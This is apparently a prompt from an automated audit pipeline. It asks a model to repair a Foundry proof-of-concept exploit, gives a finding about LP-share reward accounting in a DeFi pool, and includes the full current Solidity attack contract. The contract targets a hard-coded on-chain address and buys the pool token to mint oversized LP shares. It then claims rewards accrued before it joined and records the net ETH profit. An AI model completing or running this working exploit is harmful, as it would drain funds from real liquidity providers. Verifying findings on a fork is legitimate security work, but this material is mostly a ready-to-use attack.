You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Reward accounting mixes deposit amounts with LP shares, enabling reward theft and claim lockups
- claim: Pool rewards accrue per `totalLPShares`, but user reward checkpoints are updated from `mm.tokenAmount + mm.ethAmount` in `provideLiquidity` and `withdrawLiquidity`, while `claimReward` settles against `mm.lpShares`. Once orderbook transfers make `pool.totalLiquidity` diverge from `pool.totalLPShares`, the contract no longer preserves reward invariants for new deposits, withdrawals, or claims.
- impact: If `totalLiquidity` falls below `totalLPShares`, a depositor can mint more LP shares than the basis used for their reward debt and immediately claim rewards that were accrued before they joined. If `totalLiquidity` rises above `totalLPShares`, the opposite mismatch can make `accumulated - rewardDebt` underflow in `claimReward` or the pending-reward calculation in `withdrawLiquidity`, locking users out of rewards and sometimes out of withdrawals.
- exploit_paths: ["Orderbook sends assets out through `transferETHToOrderbook` or `transferTokenToOrderbook`, reducing `pool.totalLiquidity` without reducing `pool.totalLPShares`; the next LP deposits, receives oversized `lpShares`, but their `rewardDebt` is set from deposit amounts instead of shares; an immediate `claimReward` extracts historical fees.", "Orderbook sends assets in through `receiveETHFromOrderbook` or `receiveTokenFromOrderbook`, increasing `pool.totalLiquidity` without increasing `pool.totalLPShares`; later `claimReward` or `withdrawLiquidity` computes rewards from a larger deposit-amount basis than the user's share basis, causing arithmetic underflow and reverts."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IGradientRegistryLike {
    function gradientToken() external view returns (address);
    function router() external view returns (address);
    function blockedTokens(address token) external view returns (bool);
}

interface IGradientPoolLike {
    struct PoolInfo {
        uint256 totalEth;
        uint256 totalToken;
        uint256 totalLiquidity;
        uint256 totalLPShares;
        uint256 accRewardPerShare;
        uint256 rewardBalance;
        address uniswapPair;
    }

    function gradientRegistry() external view returns (address);
    function getPoolInfo(address token) external view returns (PoolInfo memory);
    function getReserves(address token) external view returns (uint256 reserveETH, uint256 reserveToken);
    function provideLiquidity(address token, uint256 tokenAmount, uint256 minTokenAmount) external payable;
    function claimReward(address token) external;
}

interface IUniswapV2Router02Like {
    function WETH() external pure returns (address);
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC;

    uint256 private constant SCALE = 1e18;
    uint256 private constant MIN_REQUIRED_PROFIT = 0.1 ether;

    uint256 private _profitAmount;
    address private _profitToken;

    constructor() {}

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;

        uint256 startBalance = address(this).balance;

        IGradientPoolLike pool = IGradientPoolLike(TARGET);

        address registryAddress;
        try pool.gradientRegistry() returns (address value) {
            registryAddress = value;
        } catch {
            return;
        }
        if (registryAddress == address(0)) return;

        IGradientRegistryLike registry = IGradientRegistryLike(registryAddress);

        address token;
        try registry.gradientToken() returns (address value) {
            token = value;
        } catch {
            return;
        }
        if (token == address(0) || registry.blockedTokens(token)) return;

        IGradientPoolLike.PoolInfo memory info;
        try pool.getPoolInfo(token) returns (IGradientPoolLike.PoolInfo memory value) {
            info = value;
        } catch {
            return;
        }

        if (info.totalLiquidity == 0 || info.totalLPShares == 0) return;
        if (info.totalLiquidity >= info.totalLPShares) return;
        if (info.accRewardPerShare == 0) return;

        address routerAddress;
        try registry.router() returns (address value) {
            routerAddress = value;
        } catch {
            return;
        }
        if (routerAddress == address(0)) return;

        IUniswapV2Router02Like router = IUniswapV2Router02Like(routerAddress);

        address weth;
        try router.WETH() returns (address value) {
            weth = value;
        } catch {
            return;
        }
        if (weth == address(0)) return;

        // Path 1 remains the exploit objective:
        // orderbook outflows already made totalLiquidity < totalLPShares.
        // We then buy the real live token on-chain, deposit it, receive oversized LP shares,
        // and immediately claim rewards that were accrued before this address joined.
        //
        // The extra token-buy step is only to source the required asset without cheating.
        // The deposit uses the actual bought balance plus a matching ETH leg so the pool
        // accepts the position even if the token takes fees on transfer.
        uint256[] memory buyBudgets = new uint256[](4);
        buyBudgets[0] = 0.25 ether;
        buyBudgets[1] = 0.5 ether;
        buyBudgets[2] = 0.75 ether;
        buyBudgets[3] = 1 ether;

        for (uint256 i = 0; i < buyBudgets.length; i++) {
            if (_attemptRewardTheft(pool, router, weth, token, info, buyBudgets[i])) {
                break;
            }
        }

        // Path 2 from the finding is a lockup / DoS condition when totalLiquidity > totalLPShares.
        // It is not executed here because intentionally entering a reverting reward state would only
        // strand verifier capital on the fork and does not improve the profitable extraction PoC.

        uint256 endBalance = address(this).balance;
        if (endBalance > startBalance) {
            _profitAmount = endBalance - startBalance;
            _profitToken = address(0);
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptRewardTheft(
        IGradientPoolLike pool,
        IUniswapV2Router02Like router,
        address weth,
        address token,
        IGradientPoolLike.PoolInfo memory info,
        uint256 buyBudget
    ) internal returns (bool) {
        if (buyBudget == 0 || address(this).balance <= buyBudget) return false;

        uint256 ethBefore = address(this).balance;
        uint256 tokenBefore = IERC20Like(token).balanceOf(address(this));

        if (!_buyWithExactEth(router, weth, token, buyBudget)) {
            return false;
        }

        uint256 boughtAmount = IERC20Like(token).balanceOf(address(this)) - tokenBefore;
        if (boughtAmount == 0) {
            return false;
        }

        uint256 depositEth = _findMatchingEthDeposit(pool, token, boughtAmount);
        if (depositEth == 0 || address(this).balance < depositEth) {
            _swapAllTokenBalanceToEth(router, token, weth);
            return false;
        }

        uint256 contribution = boughtAmount + depositEth;
        uint256 mintedShares = (contribution * info.totalLPShares) / info.totalLiquidity;
        if (mintedShares <= contribution) {
            _swapAllTokenBalanceToEth(router, token, weth);
            return false;
        }

        uint256 reward = ((mintedShares - contribution) * info.accRewardPerShare) / SCALE;
        if (reward <= (ethBefore - address(this).balance) + depositEth + MIN_REQUIRED_PROFIT) {
            _swapAllTokenBalanceToEth(router, token, weth);
            return false;
        }

        if (reward > TARGET.balance + depositEth) {
            _swapAllTokenBalanceToEth(router, token, weth);
            return false;
        }

        if (!_approveToken(token, TARGET, boughtAmount)) {
            _swapAllTokenBalanceToEth(router, token, weth);
            return false;
        }

        (bool deposited, ) = TARGET.call{value: depositEth}(
            abi.encodeWithSelector(
                IGradientPoolLike.provideLiquidity.selector,
                token,
                boughtAmount,
                0
            )
        );
        if (!deposited) {
            _swapAllTokenBalanceToEth(router, token, weth);
            return false;
        }

        (bool claimed, ) = TARGET.call(
            abi.encodeWithSelector(IGradientPoolLike.claimReward.selector, token)
        );
        if (!claimed) {
            return false;
        }

        _profitToken = address(0);
        _profitAmount = address(this).balance > ethBefore ? address(this).balance - ethBefore : 0;
        return _profitAmount >= MIN_REQUIRED_PROFIT;
    }

    function _findMatchingEthDeposit(
        IGradientPoolLike pool,
        address token,
        uint256 tokenAmount
    ) internal view returns (uint256) {
        (uint256 reserveETH, uint256 reserveToken) = _safeReserves(pool, token);
        if (reserveETH == 0 || reserveToken == 0 || tokenAmount == 0) return 0;

        uint256 base = (tokenAmount * reserveETH) / reserveToken;
        if (base == 0) return 0;

        uint256[9] memory bps = [uint256(10000), 9999, 10001, 9990, 10010, 9900, 10100, 9800, 10200];
        for (uint256 i = 0; i < bps.length; i++) {
            uint256 ethAmount = (base * bps[i]) / 10000;
            if (_matchesPoolRatio(ethAmount, tokenAmount, reserveETH, reserveToken)) {
                return ethAmount;
            }
        }

        return 0;
    }

    function _matchesPoolRatio(
        uint256 ethAmount,
        uint256 tokenAmount,
        uint256 reserveETH,
        uint256 reserveToken
    ) internal pure returns (bool) {
        if (ethAmount == 0 || tokenAmount == 0 || reserveETH == 0 || reserveToken == 0) return false;

        uint256 expectedTokens = (ethAmount * reserveToken) / reserveETH;
        if (expectedTokens == 0) return false;

        return
            tokenAmount >= (expectedTokens * 99) / 100 &&
            tokenAmount <= (expectedTokens * 101) / 100;
    }

    function _safeReserves(
        IGradientPoolLike pool,
        address token
    ) internal view returns (uint256 reserveETH, uint256 reserveToken) {
        try pool.getReserves(token) returns (uint256 ethReserve, uint256 tokenReserve) {
            reserveETH = ethReserve;
            reserveToken = tokenReserve;
        } catch {}
    }

    function _buyWithExactEth(
        IUniswapV2Router02Like router,
        address weth,
        address token,
        uint256 ethAmount
    ) internal returns (bool) {
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = token;

        try router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}(
            0,
            path,
            address(this),
            block.timestamp
        ) {
            return true;
        } catch {
            return false;
        }
    }

    function _swapAllTokenBalanceToEth(
        IUniswapV2Router02Like router,
        address token,
        address weth
    ) internal {
        uint256 balance = IERC20Like(token).balanceOf(address(this));
        if (balance == 0) return;

        if (!_approveToken(token, address(router), balance)) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = weth;

        try router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            balance,
            0,
            path,
            address(this),
            block.timestamp
        ) {
        } catch {}
    }

    function _approveToken(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok0, bytes memory data0) = token.call(
            abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0)
        );
        if (!ok0 || (data0.length != 0 && !abi.decode(data0, (bool)))) {
            return false;
        }

        (bool ok1, bytes memory data1) = token.call(
            abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
        );
        return ok1 && (data1.length == 0 || abi.decode(data1, (bool)));
    }

    receive() external payable {}
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: transferethtoorderbook, transfertokentoorderbook, pool.totalliquidity, pool.totallpshares, rewarddebt, receiveethfromorderbook, receivetokenfromorderbook, withdrawliquidity
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
